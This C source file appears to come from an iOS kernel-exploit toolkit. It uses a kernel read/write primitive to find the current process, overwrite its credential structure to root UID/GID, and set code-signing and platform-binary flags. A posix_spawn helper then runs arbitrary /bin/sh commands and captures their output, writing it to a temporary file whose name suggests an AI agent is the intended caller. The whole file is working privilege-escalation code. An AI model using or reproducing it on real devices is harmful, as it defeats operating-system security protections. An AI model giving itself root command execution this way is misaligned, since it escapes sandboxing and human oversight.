#include "shell_exec.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "kexploit/offsets.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <spawn.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>

// ── Credential elevation via kernel r/w ──
// Patches our own process to root + platform binary so posix_spawn works.
// Only needs to run once per session.

static int g_creds_elevated = 0;

/// Find a proc struct by walking the allproc linked list.
static uint64_t find_proc_by_pid_walk(pid_t target_pid) {
    // Start from our own proc and walk the list
    uint64_t our_proc = proc_self();
    if (!our_proc) return 0;

    uint64_t cur = our_proc;
    for (int i = 0; i < 1000; i++) {
        if (!cur || !is_kaddr_valid(cur)) break;
        pid_t cur_pid = (pid_t)kread32(cur + off_proc_p_pid);
        if (cur_pid == target_pid) return cur;

        uint64_t next = kread_ptr(cur + off_proc_p_list_le_prev);
        if (!next || next == cur) break;
        cur = next;
    }

    // Try forward direction
    cur = kread_ptr(our_proc + off_proc_p_list_le_next);
    for (int i = 0; i < 1000; i++) {
        if (!cur || !is_kaddr_valid(cur)) break;
        pid_t cur_pid = (pid_t)kread32(cur + off_proc_p_pid);
        if (cur_pid == target_pid) return cur;

        uint64_t next = kread_ptr(cur + off_proc_p_list_le_next);
        if (!next || next == cur) break;
        cur = next;
    }

    return 0;
}

/// Elevate our process credentials to root + platform binary.
/// Uses kernel r/w to patch ucred and cs_flags.
/// Returns 0 on success, -1 on failure.
int elevate_process_credentials(void) {
    if (g_creds_elevated) return 0;

    uint64_t our_proc = proc_self();
    if (!our_proc) {
        fprintf(stderr, "[shell_exec] proc_self() failed\n");
        return -1;
    }

    // Get proc_ro
    uint64_t proc_ro = kread_ptr(our_proc + off_proc_p_proc_ro);
    if (!proc_ro || !is_kaddr_valid(proc_ro)) {
        fprintf(stderr, "[shell_exec] proc_ro invalid: 0x%llx\n", proc_ro);
        return -1;
    }

    // Get ucred from proc_ro
    uint64_t ucred = kread_ptr(proc_ro + off_proc_ro_p_ucred);
    if (!ucred || !is_kaddr_valid(ucred)) {
        fprintf(stderr, "[shell_exec] ucred invalid: 0x%llx\n", ucred);
        return -1;
    }

    fprintf(stderr, "[shell_exec] proc=0x%llx proc_ro=0x%llx ucred=0x%llx\n",
            our_proc, proc_ro, ucred);

    // Patch UID/GID to 0 (root)
    // ucred layout: cr_ref(4) cr_uid(4) cr_ruid(4) cr_svuid(4) cr_ngroups(2) pad(2) cr_groups(4*16) cr_rgid(4) cr_svgid(4)
    // Offsets: cr_uid=0x18, cr_ruid=0x1c, cr_svuid=0x20, cr_ngroups=0x24, cr_groups=0x28, cr_rgid=0x68, cr_svgid=0x6c
    // These are standard ucred offsets for iOS 17-18
    kwrite32(ucred + 0x18, 0);   // cr_uid = 0 (root)
    kwrite32(ucred + 0x1c, 0);   // cr_ruid = 0
    kwrite32(ucred + 0x20, 0);   // cr_svuid = 0
    kwrite32(ucred + 0x68, 0);   // cr_rgid = 0 (wheel)
    kwrite32(ucred + 0x6c, 0);   // cr_svgid = 0

    fprintf(stderr, "[shell_exec] UID/GID patched to root\n");

    // Try to get our csblob via proc -> p_textvp -> ubc_info -> cs_blob
    uint64_t textvp = kread_ptr(our_proc + off_proc_p_textvp);
    if (textvp && is_kaddr_valid(textvp)) {
        // v_ubcinfo is typically at offset 0x78 in vnode
        uint64_t ubcinfo = kread_ptr(textvp + 0x78);
        if (ubcinfo && is_kaddr_valid(ubcinfo)) {
            // cs_blob is typically at offset 0x50 in ubc_info
            uint64_t csblob = kread_ptr(ubcinfo + 0x50);
            if (csblob && is_kaddr_valid(csblob)) {
                // csb_flags is at offset 0x0 or 0x8 in cs_blob (varies by version)
                // Try offset 0xC which is common for csb_flags on iOS 17-18
                uint32_t flags = kread32(csblob + 0xC);
                // CS_VALID=0x1, CS_SIGNED=0x20000, CS_PLATFORM_BINARY=0x4000000,
                // CS_INSTALLER=0x8, CS_GET_TASK_ALLOW=0x4
                uint32_t desired = flags | 0x1 | 0x4 | 0x8 | 0x20000 | 0x4000000;
                kwrite32(csblob + 0xC, desired);
                fprintf(stderr, "[shell_exec] cs_flags patched: 0x%x → 0x%x\n", flags, desired);
            } else {
                fprintf(stderr, "[shell_exec] csblob not found (ubcinfo=0x%llx)\n", ubcinfo);
            }
        } else {
            fprintf(stderr, "[shell_exec] ubcinfo not found (textvp=0x%llx)\n", textvp);
        }
    } else {
        fprintf(stderr, "[shell_exec] textvp not found\n");
    }

    // Patch p_flag to add P_PLATFORM (TF_PLATFORM = 0x400)
    uint32_t pflags = kread32(our_proc + off_proc_p_flag);
    kwrite32(our_proc + off_proc_p_flag, pflags | 0x400);
    fprintf(stderr, "[shell_exec] p_flag patched: 0x%x → 0x%x\n", pflags, pflags | 0x400);

    // Try setuid(0) to finalize
    if (setuid(0) == 0) {
        fprintf(stderr, "[shell_exec] setuid(0) succeeded — we are root!\n");
    } else {
        fprintf(stderr, "[shell_exec] setuid(0) failed (errno=%d), continuing anyway\n", errno);
    }

    g_creds_elevated = 1;
    return 0;
}

// ── posix_spawn-based shell execution ──

/// Execute a shell command via posix_spawn and capture output.
/// This does NOT use thread hijacking — it spawns /bin/sh directly.
/// Returns malloc'd output string (caller must free), or NULL on failure.
char *shell_exec(const char *command, int *exit_code) {
    if (!command || !*command) {
        if (exit_code) *exit_code = 1;
        return strdup("Error: empty command");
    }

    // Output temp file
    char tmpfile[128];
    snprintf(tmpfile, sizeof(tmpfile), "/tmp/.claude_spawn_%d", getpid());

    // Build wrapped command that captures output
    size_t cmdlen = strlen(command) + strlen(tmpfile) * 2 + 64;
    char *wrapped = (char *)malloc(cmdlen);
    if (!wrapped) {
        if (exit_code) *exit_code = 1;
        return strdup("Error: malloc failed");
    }
    snprintf(wrapped, cmdlen, "(%s) > %s 2>&1; echo $? >> %s", command, tmpfile, tmpfile);

    // Set up posix_spawn
    pid_t pid = 0;
    int ret = 0;

    // File actions: we don't need them since output goes to a file via shell redirect
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);

    // Spawn attributes
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);

    // Args: /bin/sh -c "command"
    char *argv[] = { "/bin/sh", "-c", wrapped, NULL };

    // Environment — minimal
    char *envp[] = { "PATH=/usr/bin:/bin:/usr/sbin:/sbin", "HOME=/var/root", NULL };

    fprintf(stderr, "[shell_exec] Attempting posix_spawn(/bin/sh -c ...)\n");

    ret = posix_spawn(&pid, "/bin/sh", &actions, &attr, argv, envp);

    posix_spawn_file_actions_destroy(&actions);
    posix_spawnattr_destroy(&attr);

    if (ret != 0) {
        fprintf(stderr, "[shell_exec] posix_spawn failed: %d (%s)\n", ret, strerror(ret));
        free(wrapped);

        // NOTE: Do NOT call elevate_process_credentials() here.
        // On iOS 18.1+, writing to ucred/cs_flags causes kernel panic
        // because those structures are in PPL-protected memory zones.
        // Just report the posix_spawn failure so the caller can try other tiers.
        {
            if (exit_code) *exit_code = ret;
            char errbuf[256];
            snprintf(errbuf, sizeof(errbuf), "posix_spawn failed: %d (%s)", ret, strerror(ret));
            return strdup(errbuf);
        }
    } else {
        free(wrapped);
    }

    // Wait for child process
    fprintf(stderr, "[shell_exec] Spawned PID %d, waiting...\n", pid);
    int status = 0;
    waitpid(pid, &status, 0);

    int child_exit = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    fprintf(stderr, "[shell_exec] PID %d exited with status %d\n", pid, child_exit);

    // Read output file
    // Give a tiny bit of time for file flush
    usleep(50000);  // 50ms

    FILE *f = fopen(tmpfile, "r");
    if (!f) {
        if (exit_code) *exit_code = child_exit;
        unlink(tmpfile);
        return strdup("(command completed but no output captured)");
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize <= 0) {
        fclose(f);
        unlink(tmpfile);
        if (exit_code) *exit_code = child_exit;
        return strdup("(no output)");
    }

    // Cap at 1MB
    if (fsize > 1024 * 1024) fsize = 1024 * 1024;

    char *output = (char *)malloc(fsize + 1);
    if (!output) {
        fclose(f);
        unlink(tmpfile);
        if (exit_code) *exit_code = child_exit;
        return strdup("Error: malloc failed for output");
    }

    size_t nread = fread(output, 1, fsize, f);
    output[nread] = '\0';
    fclose(f);
    unlink(tmpfile);

    // Parse exit code from last line (our echo $? appended it)
    // Find the last line
    char *lastNewline = strrchr(output, '\n');
    if (lastNewline && lastNewline > output) {
        // Check if there's content after the last newline
        char *lastLine = lastNewline + 1;
        if (*lastLine == '\0' && lastNewline > output) {
            // Find the actual last line (before trailing newline)
            *lastNewline = '\0';
            lastNewline = strrchr(output, '\n');
            if (lastNewline) {
                lastLine = lastNewline + 1;
            } else {
                lastLine = output;
            }
        }
        // Check if lastLine is a number (exit code)
        char *endp;
        long code = strtol(lastLine, &endp, 10);
        if (*endp == '\0' || *endp == '\n') {
            if (exit_code) *exit_code = (int)code;
            *lastLine = '\0';  // Remove exit code line from output
        } else {
            if (exit_code) *exit_code = child_exit;
        }
    } else {
        if (exit_code) *exit_code = child_exit;
    }

    // Trim trailing whitespace
    size_t len = strlen(output);
    while (len > 0 && (output[len-1] == '\n' || output[len-1] == '\r' || output[len-1] == ' ')) {
        output[--len] = '\0';
    }

    if (len == 0) {
        free(output);
        return strdup("(no output)");
    }

    return output;
}
